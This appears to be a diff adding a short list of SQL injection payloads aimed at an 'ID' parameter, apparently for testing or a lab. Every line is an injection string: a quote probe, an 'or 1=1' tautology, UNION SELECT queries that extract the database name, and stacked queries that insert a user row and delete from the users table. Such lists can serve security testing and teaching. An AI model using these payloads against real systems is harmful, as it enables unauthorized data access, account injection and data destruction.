@@ -1,0 +1,7 @@
+ID:1
+ID:1'
+ID:0 or 1=1-- -
+ID:0 or union select 1,database(),3-- -
+ID:0 union select 1,database(),3-- -
+ID:0; insert into users (username,password) values ('asd','asd');-- -
+ID:0;delete from users where username='asd';-- -
